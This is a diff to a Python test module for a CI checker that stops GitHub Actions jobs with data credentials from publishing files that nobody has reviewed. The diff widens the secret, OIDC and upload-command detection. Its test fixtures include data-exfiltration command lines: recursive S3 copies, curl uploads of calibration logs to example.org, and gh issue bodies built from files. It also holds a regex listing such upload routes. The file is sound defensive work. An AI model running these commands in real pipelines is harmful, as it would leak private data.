@@ -8,13 +8,14 @@ public.
 
 What the check does:
 
-- A job **can reach the data** when it, or its workflow, uses any secret
-  other than the GitHub token (presumed a data credential whatever it is
-  called), passes secrets on, signs in to Google Cloud, or downloads
+- A job **can reach the data** when it, or its workflow, mentions
+  ``secrets`` in any form other than ``secrets.GITHUB_TOKEN`` (presumed a
+  data credential whatever it is called), passes secrets on, can request an
+  OIDC token (``id-token: write``), signs in to Google Cloud, or downloads
   artifacts.
 - In such a job, every action must be reviewed for the inputs it is given
   (``REVIEWED_ACTIONS``), so a set-up action can't be pointed at the
-  workspace. Every artifact upload must name literal files reviewed for that
+  workspace, and setup-uv must not save its cache (``save-cache: false``). Every artifact upload must name literal files reviewed for that
   job in ``REVIEWED``: no directories, globs, exclusions or expressions.
   Every run line that matches ``PUBLISH_COMMAND`` must be, in full, a command
   reviewed for that job.
@@ -43,15 +44,21 @@ import yaml
 WORKFLOW_DIR = Path(__file__).parents[2] / ".github" / "workflows"
 WORKFLOWS = sorted(WORKFLOW_DIR.glob("*.y*ml"))
 
-# Any secret but these is presumed to reach the data.
-NON_DATA_SECRETS = ("secrets.GITHUB_TOKEN",)
-_SECRET = re.compile(r"secrets\.[A-Za-z_][A-Za-z0-9_]*")
+# Any mention of secrets but this one is presumed to reach the data, in any
+# syntax: secrets.NAME, secrets['NAME'], toJSON(secrets) (Sol re-review 2 of
+# #603).
+NON_DATA_SECRET = "secrets.GITHUB_TOKEN"
 DATA_ACTIONS = ("google-github-actions/auth",)
+# Commands that fetch or build the data, which a job publishing its whole
+# workspace must not run.
+DATA_COMMAND = re.compile(
+    r"make (download|data)\b|huggingface|hf_hub|policyengine_uk_data/storage"
+)
 
-# Actions that publish nothing when given only these inputs. setup-uv
-# caches Python packages, not datasets; its cache-path inputs are not
-# reviewed, so pointing its cache at the workspace fails (Sol re-review of
-# #603, finding 1). ``enable-cache`` may only turn caching off.
+# Actions that publish nothing when given only these inputs. setup-uv's
+# cache is on by default on hosted runners and its location can be moved
+# (UV_CACHE_DIR, [tool.uv] cache-dir), so in a data job it must not save:
+# ``save-cache: false``, or ``enable-cache: false`` (Sol re-reviews of #603).
 REVIEWED_ACTIONS = {
     "actions/checkout": {
         "fetch-depth",
@@ -65,7 +72,7 @@ REVIEWED_ACTIONS = {
     },
     "actions/setup-python": {"python-version"},
     "actions/setup-node": {"node-version"},
-    "astral-sh/setup-uv": {"version", "python-version", "enable-cache"},
+    "astral-sh/setup-uv": {"version", "python-version", "enable-cache", "save-cache"},
     "google-github-actions/auth": {"service_account", "workload_identity_provider"},
     "actions/create-github-app-token": {"app-id", "private-key"},
     "actions/download-artifact": {"name", "path", "pattern", "merge-multiple"},
@@ -87,21 +94,25 @@ REVIEWED = {
     ("versioning.yaml", "Versioning"): {
         "artifacts": {},
         "commands": (),
-        # Commits the version bump. Its secrets are the GitHub app's, and the
-        # job builds no data and downloads nothing.
+        # Commits the version bump. Its secrets are the GitHub app's. It
+        # commits the whole workspace, so it must fetch and build no data
+        # (checked: no run line matches DATA_COMMAND).
         "actions": {
             "EndBug/add-and-commit": {"add": ".", "message": "Update package version"}
         },
+        "no_data_commands": True,
     },
 }
 
 PUBLISH_COMMAND = re.compile(
-    r"make upload|publish-git-tag|\bgh (release|gist|api|pr comment|issue comment)\b"
-    r"|\bgit push\b|\bcurl\b.*(\s-T\b|--upload-file|\s-F\b|--data|\s-d\b|-X\s*(POST|PUT|PATCH))"
-    r"|\baws s3\b|\bgsutil\b|\bgcloud storage\b|huggingface-cli|\bhf upload\b|\btwine\b"
+    r"make upload|publish-git-tag|\bgh\s+[a-z]"  # any gh command
+    r"|\bgit push\b"
+    r"|\bcurl\b.*(--upload-file|--form|--json|--data|--request\s+(POST|PUT|PATCH)"
+    r"|-X\s*(POST|PUT|PATCH)|\s-[A-Za-z]*[TFd][A-Za-z]*\b)"
+    r"|\baws s3\b|\bgsutil\b|\bgcloud\b|huggingface-cli|\bhf upload\b|\btwine\b"
 )
 _NOT_LITERAL = re.compile(r"[*?\[\]{}!]|\$\{\{")
-_EMPTY = {"artifacts": {}, "commands": (), "actions": {}}
+_EMPTY = {"artifacts": {}, "commands": (), "actions": {}, "no_data_commands": False}
 
 
 def _jobs(workflow: dict) -> dict:
@@ -115,7 +126,15 @@ def _triggers(workflow: dict) -> dict:
 
 
 def _uses_data_secret(text: str) -> bool:
-    return any(s not in NON_DATA_SECRETS for s in _SECRET.findall(text))
+    return bool(re.search(r"\bsecrets\b", text.replace(NON_DATA_SECRET, "")))
+
+
+def _requests_oidc(block) -> bool:
+    permissions = (block or {}).get("permissions")
+    return (
+        isinstance(permissions, dict)
+        and str(permissions.get("id-token", "")).strip('"') == "write"
+    )
 
 
 def reaches_data(job: dict, workflow: dict | None = None) -> bool:
@@ -124,10 +143,14 @@ def reaches_data(job: dict, workflow: dict | None = None) -> bool:
         {"env": workflow.get("env"), "defaults": workflow.get("defaults")}
     )
     call = _triggers(workflow).get("workflow_call") or {}
-    if _uses_data_secret(shared) or (isinstance(call, dict) and call.get("secrets")):
+    if (
+        _uses_data_secret(shared)
+        or (isinstance(call, dict) and call.get("secrets"))
+        or _requests_oidc(workflow)
+    ):
         return True
     text = yaml.safe_dump(job)
-    if "secrets" in job or _uses_data_secret(text):
+    if "secrets" in job or _uses_data_secret(text) or _requests_oidc(job):
         return True
     return any(
         str(step.get("uses", "")).split("@", 1)[0]
@@ -210,13 +233,21 @@ def problems(name: str, workflow: dict) -> list:
                             f"{where} gives {action} unreviewed inputs: "
                             + ", ".join(sorted(extra))
                         )
-                    if action == "astral-sh/setup-uv" and inputs.get(
-                        "enable-cache", False
-                    ) not in (False, "false"):
-                        out.append(f"{where} turns setup-uv's cache on explicitly")
+                    if action == "astral-sh/setup-uv":
+                        off = lambda key: inputs.get(key) in (False, "false")  # noqa: E731
+                        if not (off("save-cache") or off("enable-cache")):
+                            out.append(
+                                f"{where} lets setup-uv save its cache "
+                                "(set save-cache: false)"
+                            )
                 else:
                     out.append(f"{where} uses an unreviewed action: {uses}")
             script = str(step.get("run", ""))
+            if reviewed["no_data_commands"] and DATA_COMMAND.search(script):
+                out.append(
+                    f"{where} publishes its workspace, so it must not fetch or "
+                    "build the data"
+                )
             for line in logical_lines(script):
                 if PUBLISH_COMMAND.search(line) and line not in reviewed["commands"]:
                     out.append(
@@ -262,7 +293,7 @@ DATA_JOB = {
     "env": {"HUGGING_FACE_TOKEN": "${{ secrets.HUGGING_FACE_TOKEN }}"},
     "steps": [
         {"uses": "actions/checkout@v6"},
-        {"uses": "astral-sh/setup-uv@v8.1.0"},
+        {"uses": "astral-sh/setup-uv@v8.1.0", "with": {"save-cache": False}},
         {"run": "uv run --frozen make data"},
     ],
 }
@@ -316,6 +347,11 @@ def test_an_unreviewed_upload_from_a_data_job_fails(path):
         {"run": "aws s3 cp . s3://bucket --recursive"},
         {"run": "git push origin HEAD:logs"},
         {"run": "curl \\\n  -T la_calibration_log.csv \\\n  https://example.org/"},
+        {"run": "gh issue create -t x --body-file constituency_calibration_log.csv"},
+        {"run": "gh pr edit 1 --body-file la_calibration_log.csv"},
+        {"run": "curl -sT la_calibration_log.csv https://example.org/"},
+        {"run": "curl --form f=@la_calibration_log.csv https://example.org/"},
+        {"run": "curl --json @la_calibration_log.csv https://example.org/"},
     ],
 )
 def test_other_routes_out_of_a_data_job_fail(step):
@@ -329,16 +365,22 @@ def test_other_routes_out_of_a_data_job_fail(step):
         {"cache-local-path": "."},
         {"enable-cache": True},
         {"cache-dependency-glob": "**/*.csv"},
+        {},  # the default saves the cache on hosted runners
+        None,
     ],
 )
-def test_a_set_up_action_pointed_at_the_workspace_fails(inputs):
-    """Sol re-review of #603, finding 1: setup-uv's post step saves its cache."""
-    assert _with_step({"uses": "astral-sh/setup-uv@v8.1.0", "with": inputs})
+def test_setup_uv_saving_its_cache_in_a_data_job_fails(inputs):
+    """Sol re-reviews of #603: the post step saves the cache, wherever
+    UV_CACHE_DIR points by then."""
+    step = {"uses": "astral-sh/setup-uv@v8.1.0"}
+    if inputs is not None:
+        step["with"] = inputs
+    assert _with_step(step)
 
 
-def test_turning_setup_uvs_cache_off_passes():
-    step = {"uses": "astral-sh/setup-uv@v8.1.0", "with": {"enable-cache": False}}
-    assert _with_step(step) == []
+@pytest.mark.parametrize("inputs", [{"save-cache": False}, {"enable-cache": False}])
+def test_setup_uv_that_does_not_save_passes(inputs):
+    assert _with_step({"uses": "astral-sh/setup-uv@v8.1.0", "with": inputs}) == []
 
 
 @pytest.mark.parametrize(
@@ -380,6 +422,9 @@ def test_a_workflow_level_credential_makes_every_job_a_data_job():
     "job",
     [
         {"env": {"GH_TOKEN": "${{ secrets.ANY_NAME }}"}, "steps": []},
+        {"env": {"HF": "${{ secrets['HUGGING_FACE_TOKEN'] }}"}, "steps": []},
+        {"env": {"ALL": "${{ toJSON(secrets) }}"}, "steps": []},
+        {"permissions": {"id-token": "write"}, "steps": []},
         {"uses": "org/repo/.github/workflows/build.yaml@main", "secrets": "inherit"},
         {"steps": [{"uses": "google-github-actions/auth@v3"}]},
         {"steps": [{"uses": "actions/download-artifact@v8"}]},
@@ -459,3 +504,17 @@ def test_a_reviewed_file_needs_its_producer_in_an_earlier_step(producer, monkeyp
     assert _with_step(_upload("summary.json"), produce)
     assert _with_step(produce, _upload("summary.json")) == []
     assert _with_step(produce, _upload("summary.json\nlog.csv"))
+
+
+def test_a_workflow_level_oidc_permission_makes_a_data_job():
+    workflow = {"permissions": {"id-token": "write"}, "jobs": {"a": {"steps": []}}}
+    assert reaches_data(workflow["jobs"]["a"], workflow)
+
+
+def test_the_versioning_commit_may_not_follow_a_data_build():
+    """Sol re-review 2 of #603, finding 3: it commits the whole workspace."""
+    data = copy.deepcopy(_load(WORKFLOW_DIR / "versioning.yaml"))
+    _jobs(data)["Versioning"]["steps"].insert(1, {"run": "uv run make data"})
+    assert any(
+        "must not fetch or build" in p for p in problems("versioning.yaml", data)
+    )
